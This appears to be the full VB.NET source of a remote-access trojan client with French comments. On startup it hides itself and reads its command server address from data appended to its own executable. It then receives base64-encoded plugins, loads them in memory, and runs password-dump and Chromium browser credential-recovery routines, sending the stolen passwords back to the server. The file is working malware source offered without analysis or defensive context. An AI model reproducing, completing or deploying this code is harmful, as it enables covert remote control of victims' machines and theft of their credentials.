Imports System.Collections.Concurrent
Imports System.Net
Imports System.Net.Sockets
Imports System.Reflection
Imports System.Text
Imports System.Threading

Public Class Form1
    Public Connecteddd As Boolean = False
    Dim splitz As String = "||||SPLITTTT||||"
    Dim MonClient As TcpClient
    Dim id As String
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click 'Bouton de connexion.

        Try 'Pour éviter les erreurs
            If (Button1.Text = "Se connecter") Then
                MonClient = New TcpClient()
                MonClient.Connect(IPAddress.Parse("127.0.0.1"), Integer.Parse(TextPort.Text))
                Dim Context As TaskScheduler = TaskScheduler.FromCurrentSynchronizationContext()
                If MonClient.Connected Then
                    ''
                    Dim l As New Random
                    id = l.Next(100000, 999999).ToString
                    Dim k = id + "THISISMYID"
                    Dim buffer() As Byte = Encoding.UTF8.GetBytes(k)
                    MonClient.GetStream().Write(buffer, 0, buffer.Length)
                    '''
                End If
                Task.Run(Sub() LireLesMessages(Context, MonClient.GetStream()))
                Button1.Text = "Se déconnecter"
            Else
                MonClient.Close()
                Button1.Text = "Se connecter"
            End If
        Catch ex As Exception
            MessageBox.Show(ex.Message, "Erreur") 'Afficher l'erreur.
        End Try

    End Sub

    Private Sub LireLesMessages(ByVal Context As TaskScheduler, ByVal stream As NetworkStream) 'Lire les messages du serveur

        Try
            Dim Buffer(4096) As Byte
            While (True)
                Dim lu As Integer = stream.Read(Buffer, 0, Buffer.Length)
                If (lu > 0) Then
                    Dim Message As String = Encoding.UTF8.GetString(Buffer, 0, lu)
                    Task.Factory.StartNew(Sub() NouveauMessage(Message, False), CancellationToken.None, TaskCreationOptions.None, Context)
                Else
                    Task.Factory.StartNew(Sub() NouveauMessage("Le serveur a fermé la connexion.", True), CancellationToken.None, TaskCreationOptions.None, Context)
                    Exit Sub
                End If

            End While
        Catch ex As Exception
            Exit Sub
        End Try

    End Sub


    Public Sub PWLOAD(ByVal byt As Byte(), ByVal type As String, ByVal methodl As String)
        Dim assemblytoload As Assembly = Assembly.Load(byt)

        Dim method As MethodInfo = assemblytoload.[GetType](type).GetMethod(methodl)
        Dim obj As Object = assemblytoload.CreateInstance(method.Name)

        Dim ks As String = CStr(method.Invoke(obj, Nothing)) + vbCrLf + "END PASSWORD"

        Dim buffer() As Byte = Encoding.UTF8.GetBytes(ks)
        MonClient.GetStream().Write(buffer, 0, buffer.Length)


        TextBox1.Text = String.Empty

    End Sub
    Public Sub MessageFromHost(ByVal h As String)
        MessageBox.Show(h, "Heathen", MessageBoxButtons.OK, MessageBoxIcon.Information)
        TextBox1.Text = String.Empty
    End Sub
    Private Sub NouveauMessage(ByVal message As String, ByVal Fermé As Boolean)
        TextBox1.AppendText(message)

        If TextBox1.Text.EndsWith("ThisIsPWPlugin") Then

            '   Dim k As String = TextBox1.Text.Replace("ThisIsPWPlugin", "")

            TextBox1.Text = TextBox1.Text.Replace("ThisIsPWPlugin", "")
            Dim o As Byte() = Convert.FromBase64String(TextBox1.Text)

            Task.Run(Sub() PWLOAD(o, "PW.SteelPassword", "Dump"))
            '   PW.SteelPassword.Dump



        ElseIf TextBox1.Text.EndsWith("ThisPWPlugin2") Then


            'Plugin.Browsers.Chromium.Chromium.Recovery

            Dim odd = TextBox1.Text.Replace("ThisPWPlugin2", "")
            Dim o As Byte() = Convert.FromBase64String(odd)

            Task.Run(Sub() PWLOAD(o, "Plugin.Browsers.Chromium.Chromium", "Recovery"))

        ElseIf TextBox1.Text.EndsWith("ITSTIMETOSLEEP") Then
            Dim o As String = MonClient.Client.LocalEndPoint.ToString
            Dim buffer() As Byte = Encoding.UTF8.GetBytes(o + "Deco")

            MonClient.GetStream().Write(buffer, 0, buffer.Length)
            Application.Exit()
        ElseIf TextBox1.Text.EndsWith("MESASADDSDSD") Then
            Dim kkj As String = TextBox1.Text.Replace("MESASADDSDSD", "")
            MessageFromHost(kkj)

            If (Fermé) Then
                Button1.Text = "Se connecter"
                MonClient.Close()
            End If
        End If
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click 'Bouton envoyer un message au serveur.
        If (Button1.Text = "Se déconnecter") Then
            Dim buffer() As Byte = Encoding.UTF8.GetBytes(TextBox2.Text)
            MonClient.GetStream().Write(buffer, 0, buffer.Length)
            TextBox2.Text = ""
        End If
    End Sub
    Private Sub Form1_FormClosing(ByVal sender As System.Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles MyBase.FormClosing




        '    CheckIfRunning()


        '    Process.Start(Application.ExecutablePath)
        If e.CloseReason = CloseReason.TaskManagerClosing Then
            '  e.Cancel = True 
            Dim o As String = MonClient.Client.LocalEndPoint.ToString
            Dim buffer() As Byte = Encoding.UTF8.GetBytes(o + "Deco")







            MonClient.GetStream().Write(buffer, 0, buffer.Length)
            ' Process.Start(Application.ExecutablePath)
        End If


        If (e.CloseReason = CloseReason.UserClosing) Then
            '  e.Cancel = True
            Dim o As String = MonClient.Client.LocalEndPoint.ToString


            Dim buffer() As Byte = Encoding.UTF8.GetBytes(o + "Deco")
            MonClient.GetStream().Write(buffer, 0, buffer.Length)
            '  CheckIfRunning()
        End If




        If e.CloseReason = CloseReason.None Then
            '    e.Cancel = True

            Dim o As String = MonClient.Client.LocalEndPoint.ToString



            Dim buffer() As Byte = Encoding.UTF8.GetBytes(o + "Deco")
            MonClient.GetStream().Write(buffer, 0, buffer.Length)
            '  CheckIfRunning()
            '    Process.Start(Application.ExecutablePath)
            '
        End If
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Hide()
        Me.ShowInTaskbar = False
        Me.ShowIcon = False

        FileOpen(1, System.Windows.Forms.Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read)
        Dim data As String = Space(LOF(1))
        FileGet(1, data)
        FileClose(1)

        Dim options() As String

        options = Split(data, splitz)




        If options(3) = "true" Then
            Helpe.startp(options(4))


        End If


        Try 'Pour éviter les erreurs

            MonClient = New TcpClient()
                MonClient.Connect(IPAddress.Parse(options(1)), Integer.Parse(options(2)))
                Dim Context As TaskScheduler = TaskScheduler.FromCurrentSynchronizationContext()
            If MonClient.Connected Then
                ''
                Connecteddd = True
                Dim l As New Random
                id = l.Next(100000, 999999).ToString
                Dim k = id + "THISISMYID"
                Dim buffer() As Byte = Encoding.UTF8.GetBytes(k)
                MonClient.GetStream().Write(buffer, 0, buffer.Length)
                '''

            Else
                Timer1.Start()
            End If
                Task.Run(Sub() LireLesMessages(Context, MonClient.GetStream()))
                Button1.Text = "Se déconnecter"

            'MonClient.Close()

        Catch ex As Exception
            MessageBox.Show(ex.Message, "Erreur") 'Afficher l'erreur.
        End Try
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick

        Try
            FileOpen(1, System.Windows.Forms.Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read)
            Dim data As String = Space(LOF(1))
            FileGet(1, data)
            FileClose(1)

            Dim options() As String

            options = Split(data, splitz)



            MonClient = New TcpClient()
            MonClient.Connect(IPAddress.Parse(options(1)), Integer.Parse(options(2)))
            Dim Context As TaskScheduler = TaskScheduler.FromCurrentSynchronizationContext()
            If MonClient.Connected Then
                ''
                Connecteddd = True
                Dim l As New Random
                id = l.Next(100000, 999999).ToString
                Dim k = id + "THISISMYID"
                Dim buffer() As Byte = Encoding.UTF8.GetBytes(k)
                MonClient.GetStream().Write(buffer, 0, buffer.Length)
                '''

            Else
            End If

        Catch ex As Exception

        End Try
    End Sub
End Class

